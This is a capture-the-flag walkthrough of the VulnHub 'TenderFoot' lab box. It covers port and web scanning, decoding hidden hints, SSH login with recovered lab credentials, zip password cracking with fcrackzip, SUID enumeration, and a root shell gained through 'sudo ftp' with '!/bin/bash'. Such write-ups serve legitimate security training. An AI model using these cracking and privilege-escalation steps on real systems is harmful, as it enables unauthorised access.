
# TenderFoot - CTF

Available on VulnHub: https://www.vulnhub.com/entry/tenderfoot-1,581/


## Walkthrough

### IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.175   08:00:27:59:76:7b      1      xx  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Port Scanning

```
$ nmap -AT4 -p- 192.168.1.175
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-07 17:19 EST
Nmap scan report for 192.168.1.175
Host is up (0.00041s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:b7:2d:95:e1:06:7f:a3:f1:8e:bc:5b:4c:29:19:61 (RSA)
|   256 42:0c:c9:6d:1d:e9:84:19:6a:8a:d5:51:2c:69:c6:98 (ECDSA)
|_  256 14:4d:74:42:78:67:9b:f3:dd:00:40:24:4d:12:c9:de (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.77 seconds
```

### Web Analysis

```
$ nikto -h http://192.168.1.175

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.175
+ Target Hostname:    192.168.1.175
+ Target Port:        80
+ Start Time:         2020-11-07 17:20:21 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2c9e, size: 5b0d674cf1e2f, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2020-11-07 17:20:38 (GMT-5) (17 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
$ dirb http://192.168.1.175

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Nov  7 17:20:24 2020
URL_BASE: http://192.168.1.175/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.175/ ----
+ http://192.168.1.175/index.html (CODE:200|SIZE:11422)                                                              
+ http://192.168.1.175/robots.txt (CODE:200|SIZE:191)                                                                
+ http://192.168.1.175/server-status (CODE:403|SIZE:278)                                                             
                                                                                                                     
-----------------
END_TIME: Sat Nov  7 17:20:26 2020
DOWNLOADED: 4612 - FOUND: 3
```

### Robots.txt

Has an path directory `/hint` obfuscated on `/robots.txt` source code
```
<pre>Found Something ?

...

Here is a directory open it 
/hint
</pre>
```

Accessing `http://192.168.1.175/hint` we found a obfuscated message
```
.
..
...

<!--
EBPV6X27L5PV6X27L5PV6X27L5PV6X27L4FHYICOGB2GQ2LOM4QEQZLSMUQSAIBAEAQCA7AKPQQFI4TZEBZW63LFORUGS3THEBSWY43FEF6AUIBNFUWS2LJNFUWS2LJNFUWS2LJNFUWS2LIKIVXHK3LFOJQXIZJANVXXEZJAHIUQ====

Decrypt it!
-->
```

This blob is actually Base32 encoded, not encrypted.\
Decoding it we found this follow plain text message:
```
$ echo "EBPV6X27L5PV6X27L5PV6X27L5PV6X27L4FHYICOGB2GQ2LOM4QEQZLSMUQSAIBAEAQCA7AKPQQFI4TZEBZW63LFORUGS3THEBSWY43FEF6AUIBNFUWS2LJNFUWS2LJNFUWS2LJNFUWS2LIKIVXHK3LFOJQXIZJANVXXEZJAHIUQ====" | base32 -d
 ____________________
| N0thing Here!      |
| Try something else!|
 --------------------
Enumerate more :)
```

### Let's Enumerate More

Back to enumeration step.\
Now I ran the biggest wordlist for WEB directory list of `dirbuster` using `gobuster`
```
$ gobuster dir -u http://192.168.1.175 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x .php,.txt,.js,/,.html

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.175
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,js,/,html
[+] Timeout:        10s
===============================================================
2020/11/07 17:53:52 Starting gobuster
===============================================================
/index.html (Status: 200)
/robots.txt (Status: 200)
/entry.js (Status: 200)
/fotocd (Status: 301)
===============================================================
2020/11/07 17:56:30 Finished
===============================================================
```

### /entry.js

This file has one line. It can be useful on the future.
```
monica
```

### /fotocd

This URL path has an obfuscated message on its source code:

```
<!--

+++++ ++[-> +++++ ++<]> +++++ +++++ ++... ..... ..... ....< +++++ +[->-
----- <]>-- ----- ----- .---. <++++ ++++[ ->+++ +++++ <]>.- ----- .<+++
+++[- >++++ ++<]> +++.< +++++ ++[-> ----- --<]> ----- .<+++ ++[-> +++++
<]>+. +++++ .<+++ +[->+ +++<] >++++ +++.< +++[- >+++< ]>+++ .<+++ +++[-
>---- --<]> ----- ----. ----- ----. ----. .<+++ +++[- >---- --<]> -----
----- --.-- -.<++ +++++ [->++ +++++ <]>++ ..... ..... ..... ..<++ ++++[
->--- ---<] >---- ----- ---.- --.++ +.--- .<+++ ++++[ ->+++ ++++< ]>+++
+++++ +.<++ ++++[ ->+++ +++<] >+.-- ---.< +++++ +++[- >---- ----< ]>---
-.<++ +++++ ++[-> +++++ ++++< ]>+++ +++++ .<+++ [->-- -<]>- .++++ ++.<+
+++++ +++[- >---- ----- <]>-- --.<+ +++++ ++[-> +++++ +++<] >++++ ++.++
+++++ ++.++ ++++. ----- --.<+ ++[-> ---<] >-.<+ +++++ ++[-> ----- ---<]
>---- .<+++ +++++ +[->+ +++++ +++<] >++++ .--.< +++[- >---< ]>--- --.<+
++[-> +++<] >++++ .---- .<+++ [->-- -<]>- ---.< +++[- >+++< ]>+++ .----
----. <++++ ++++[ ->--- ----- <]>-- ---.< +++++ [->++ +++<] >++++ ++.<+
+++++ +[->- ----- -<]>- .---. <++++ +++++ [->++ +++++ ++<]> +++++ +++++
++++. ---.< +++++ +++[- >---- ----< ]>--- ---.< +++++ ++++[ ->+++ +++++
+<]>+ +++++ ++.<+ +++[- >---- <]>-- --.<+ ++[-> +++<] >++++ +.<++ +++++
[->-- ----- <]>-- ----- -.<++ ++++[ ->--- ---<] >---- ----- .---. <++++
[->++ ++<]> +++++ +.... <++++ +++[- >++++ +++<] >+++. <++++ [->++ ++<]>
++++. ---.+ +++++ +++.< +++++ +++[- >---- ----< ]>--- ----- ----- -.<++
+++++ ++[-> +++++ ++++< ]>+++ +++++ .<+++ [->-- -<]>- .++++ ++.<+ +++++
+++[- >---- ----- <]>-- --.<+ +++++ ++[-> +++++ +++<] >++++ ++++. -----
--.<+ +++[- >++++ <]>++ +++.< ++++[ ->--- -<]>- .<+++ +++++ [->-- -----
-<]>- ----. <++++ ++++[ ->+++ +++++ <]>++ +.<++ +[->+ ++<]> +++++ +.<++
+[->- --<]> ----. -.<++ +++++ [->-- ----- <]>-- ---.< +++[- >---< ]>---
--.<+ +++++ ++[-> +++++ +++<] >++++ +++++ +++++ +.--- ----- -.<++ +++++
+[->- ----- --<]> ----- -.<++ +++++ +[->+ +++++ ++<]> +++++ +++++ +++++
.-.-- ----- --.<+ +++++ ++[-> ----- ---<] >---- -.<++ +++++ ++[-> +++++
++++< ]>+++ +.--. <+++[ ->--- <]>-- ---.< +++[- >+++< ]>+++ +.<++ +++++
+[->- ----- --<]> ----- -.<++ +[->- --<]> ---.< +++++ +++[- >++++ ++++<
]>+++ ++.++ +++++ ++.++ ++++. <+++[ ->--- <]>-- ----. <+++[ ->+++ <]>++
++.<+ +++++ +++[- >---- ----- <]>-. <++++ ++++[ ->+++ +++++ <]>++ +++++
++.++ +++.+ +++++ .---- -.<++ +++++ +[->- ----- --<]> ----- ----- -----
.<+++ +++++ +[->+ +++++ +++<] >++++ .--.< +++[- >---< ]>--- --.<+ ++[->
+++<] >++++ .<+++ +++++ +[->- ----- ---<] >-.<+ +++++ ++[-> +++++ +++<]
>+.++ ..<++ +[->+ ++<]> +++.+ +++++ .---- ---.+ +++++ .<+++ +++++ +[->-
----- ---<] >---. <++++ [->-- --<]> ---.- --.<+ +++[- >++++ <]>++ ++++.
...<+ +++++ ++[-> +++++ +++<] >++.< ++++[ ->+++ +<]>+ +++++ +.<++ +++++
++[-> ----- ----< ]>--- ----- .<+++ +++++ +[->+ +++++ +++<] >++.. <+++[
->--- <]>-- .<+++ +++++ [->-- ----- -<]>- ----- --.<+ +++++ ++[-> +++++
+++<] >++++ +++++ +++++ ++.-. +++.+ +.<++ +++++ +[->- ----- --<]> -----
-.<++ +[->- --<]> ----- .<+++ +++++ +[->+ +++++ +++<] >++.+ +++++ .<+++
[->-- -<]>- -.+++ +++.< ++++[ ->--- -<]>- --.<+ +++[- >++++ <]>++ +++++
.<+++ ++++[ ->--- ----< ]>--- ----- ----- .<+++ +++++ [->++ +++++ +<]>+
.---- ----. .<+++ [->-- -<]>- -.<++ +++++ +[->- ----- --<]> ----- ---.<
+++++ ++++[ ->+++ +++++ +<]>+ +++.- -.<++ +[->- --<]> ----- .<+++ [->++
+<]>+ +++.- ---.< +++[- >---< ]>--- -.<++ +[->+ ++<]> +++.- ----- --.<+
+++++ [->-- ----< ]>-.+ +++++ +++.+ +++++ +.<++ ++++[ ->+++ +++<] >++++
+++++ .<+++ +++++ ++[-> ----- ----- <]>-- ----- ----- .---. <++++ +++++
[->++ +++++ ++<]> +++++ +++++ ++++. ---.< +++++ +++[- >---- ----< ]>---
---.< +++++ +++[- >++++ ++++< ]>+++ +++++ +++++ +.+.+ ++++. <++++ +++[-
>---- ---<] >---- ----- .<+++ +++[- >---- --<]> ----- ----. ---.< ++++[
->+++ +<]>+ +++++ ....< +++++ ++[-> +++++ ++<]> +++.< ++++[ ->+++ +<]>+
+++.- --.++ +++++ ++.<+ +++++ ++[-> ----- ---<] >---- ----- ----- .<+++
+++++ [->++ +++++ +<]>+ ++++. +++++ ++++. +++++ ++.-- ----- -.--- -----
.<+++ [->++ +<]>+ +++.< ++++[ ->--- -<]>- .<+++ +[->+ +++<] >+++. <+++[
->--- <]>-- ----. <++++ ++++[ ->--- ----- <]>-- ---.< +++++ +++[- >++++
++++< ]>+++ +++++ +++++ .++.+ ++.<+ ++[-> ---<] >---- .<+++ +++++ [->--
----- -<]>- ----. <++++ +[->+ ++++< ]>+.< ++++[ ->--- -<]>- .<+++ ++[->
----- <]>-- -.--- .<+++ +[->+ +++<] >++++ ++... .<+++ +++[- >++++ ++<]>
+++.< ++++[ ->--- -<]>- ----- -..<+ +++[- >++++ <]>++ ++.<+ +++++ [->--
----< ]>.<+ +++++ [->++ ++++< ]>+++ +++++ .++++ +++++ .<+++ +[->- ---<]
>--.+ +++++ ++.<+ +++++ [->-- ----< ]>--- ----. +.<++ ++[-> ----< ]>---
-.--- .<

What is this?
Ask to G00GLE !
-->
```

### Brainfuck

I searched on Google and I found that this is a Brainfuck code.\
Using this Brainfuck Visualizer ( https://fatiherikli.github.io/brainfuck-visualizer/ ) we got this follow result:
```
=================
JDk5OTkwJA==
=================

Did you found username ?

if yes:
    Then you have cred. of one user, enter into user account 
    by ssh port. syntax:{ssh username@IP}

if not:
    Then enumerate more :)
    G00D LUCK !
```

Decoding the Base64 blob
```
$ echo "JDk5OTkwJA==" | base64 -d
$99990$
```

### SSH Connection

User: **monica**
Pass: **\$99990\$**
```
$ ssh monica@192.168.1.175
monica@192.168.1.175's password: $99990$

Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing self-healing high availability clustering for MicroK8s!
   Super simple, hardened and opinionated Kubernetes for production.

     https://microk8s.io/high-availability

69 packages can be updated.
47 updates are security updates.

Last login: Mon Oct  5 01:21:39 2020 from 10.0.2.60

monica@TenderFoot:~$ id
uid=1001(monica) gid=1001(monica) groups=1001(monica)
```

### Flag #1

```
monica@TenderFoot:~$ cat user1.txt

                                                            @@@@@@@,                                 
                                                          @@@@@@@@@&                                
                                                         &@@@@@@@@@@*                               
                                                        @@@@@@@@@@@@,                               
                                                      .@@@@@@@@@@@@@                                
                                                     @@@@@@@@@@@@@@                                 
                                                   @@@@@@@@@@@@@@@                                  
                                                /@@@@@@@@@@@@@@@&                                   
                                             .@@@@@@@@@@@@@@@@@,                                    
                                           @@@@@@@@@@@@@@@@@@@                                      
                                        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*                     
                    (%%%%%%%%%%%%*   ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                  
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                  
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                  
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                   
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&                   
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/                  
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                   
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&.                    
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/                    
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(                    
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,                     
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*                      
                   @@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/                      
                   @@@@@@@@@@@@@@@%   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.  

========================================================
========================================================

Great! Y0U F0UND Y0UR FIR5T FL4G!
Try to Find out user2.txt (your 2nd flag) :)

========================================================
========================================================
```

### Joey

```
monica@TenderFoot:~/joey/have/a/gift/for/monica$ cat note.txt 

Got to /fotocd/0x0343548764 directory in browser.
```

This WEB path `http://192.168.1.175/fotocd/0x0343548764/` contains 2 files:
* joey.zip
* note.txt
\
The `note.txt` contains the password of `joey.zip`
```
Here is a zip file for you, unzip it !
"#9175"
```

After unzip `joey.zip`, we found 2 files:
* gift.zip
* note.txt
\
The `note.txt` says to try to crack the `gift.zip` password
```
=======================================================
=======================================================
Not this time DUDE!

Just G00GLE and learn how to crack zip passwords :)

you will learn new thing!
=======================================================
=======================================================
```

### Cracking gift.zip File Password

I used the `fcrackzip` and `rockyou` wordlist to crack the password
```
$ fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' gift.zip
PASSWORD FOUND!!!!: pw == h4ck3d
```

Unzip `gift.zip`
```
$ unzip gift.zip
[gift.zip] gift.txt password: h4ck3d

$ cat gift.txt 
===================================================================================================
===================================================================================================
Hahaha! there is no gift !
Your Bad Luck!

But what happened if you don't get gift.

Take a hint from my side, which may help you to solve this box further.

I make a binary to get another user's shell,
Just google, command for search/find SUID or binaries and figure it out how to execute this binary.

G00D LUCK! :)
==================================================================================================
==================================================================================================
```

### Privilege Escalation (Chandler)

```
monica@TenderFoot:~$ find / -type f -perm -u=s 2>/dev/null

/bin/ping6
/bin/su
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping
/opt/exec/chandler
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/netkit-ftp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/chfn
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
```

Running `/opt/exec/chandler` binary
```
monica@TenderFoot:~$ /opt/exec/chandler

chandler@TenderFoot:~$ id
uid=1000(chandler) gid=1000(chandler) groups=1000(chandler),1001(monica)
```

### Flag #2

```
chandler@TenderFoot:/home/chandler/.cache$ cat user2.txt 

 ██████╗ ██████╗  ██████╗ ██╗     ██╗
██╔════╝██╔═████╗██╔═████╗██║     ██║
██║     ██║██╔██║██║██╔██║██║     ██║
██║     ████╔╝██║████╔╝██║██║     ╚═╝
╚██████╗╚██████╔╝╚██████╔╝███████╗██╗
 ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝

===================================
Great You got your 2nd Flag too! :)
You are one step away from root!
===================================
```

### Chandler's Note

```
chandler@TenderFoot:/home/chandler/.cache$ cat note.txt

================================================================================

If you have reach till here, congrats you solved 90% of the B0X!
Now your next task is to get root shell! , for that i use binary
like previously you did to get chandler's shell. Same you have to do 
difference is monica can not run sudo commands but chandler can run sudo 
commands. I'll give you a master key, this may be help you somewhere :)
When you found SUID/binary then search how to get root shell by this binary
GTFOBins may help you.

KEY --> OBQXG43XMQ5FSMDVINZDIY3LJUZQ====

===============================================================================
```

Decoding Base32 blob
```
$ echo "OBQXG43XMQ5FSMDVINZDIY3LJUZQ====" | base32 -d
passwd:Y0uCr4ckM3
```

User: **chandler**
Pass: **Y0uCr4ckM3**

### Privilege Escalation (Root)

Switching to chandler's user
```
chandler@TenderFoot:~$ su chandler
Password: Y0uCr4ckM3

chandler@TenderFoot:/home/monica$ id
uid=1000(chandler) gid=1000(chandler) groups=1000(chandler),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

Chandler is allowed to run `ftp` as root
```
chandler@TenderFoot:~$ sudo -l
Matching Defaults entries for chandler on TenderFoot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User chandler may run the following commands on TenderFoot:
    (root) NOPASSWD: /usr/bin/ftp
```

Calling bash from FTP shell
```
chandler@TenderFoot:~$ sudo ftp
ftp>
ftp> !/bin/bash

root@TenderFoot:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Flag #3

```
root@TenderFoot:~# cat /root/last_note.txt

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Well! congrats! for root this box, this is my first box very easy and basic.

I make this box for begginers, so that they have an basic idea what steps we have
to do to root box. 

Hope you like this box and learn something new. If you like please share your feedback.

See you in next box! and may be it will not that much EASY! :)

G00D LUCK!

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
```

```
root@TenderFoot:~# cat /root/proof.txt

**************************************************************************************************************
'########:'########:'##::: ##:'########::'########:'########::'########::'#######:::'#######::'########:'####:*
... ##..:: ##.....:: ###:: ##: ##.... ##: ##.....:: ##.... ##: ##.....::'##.... ##:'##.... ##:... ##..:: ####:*
::: ##:::: ##::::::: ####: ##: ##:::: ##: ##::::::: ##:::: ##: ##::::::: ##:::: ##: ##:::: ##:::: ##:::: ####:*
::: ##:::: ######::: ## ## ##: ##:::: ##: ######::: ########:: ######::: ##:::: ##: ##:::: ##:::: ##::::: ##::*
::: ##:::: ##...:::: ##. ####: ##:::: ##: ##...:::: ##.. ##::: ##...:::: ##:::: ##: ##:::: ##:::: ##:::::..:::*
::: ##:::: ##::::::: ##:. ###: ##:::: ##: ##::::::: ##::. ##:: ##::::::: ##:::: ##: ##:::: ##:::: ##::::'####:*
::: ##:::: ########: ##::. ##: ########:: ########: ##:::. ##: ##:::::::. #######::. #######::::: ##:::: ####:*
:::..:::::........::..::::..::........:::........::..:::::..::..:::::::::.......::::.......::::::..:::::....::*
*************************************************************************************************************

Congratulations! you found last flag of tenderfoot :)
I'll be glad if you take screenshot of this and give me feedback on,

Twitter --> (@_Anant_chauhan)
Discord --> (infinity_#9175)
Linkedin --> (https://www.linkedin.com/in/anant-chauhan-a07b2419b)
```
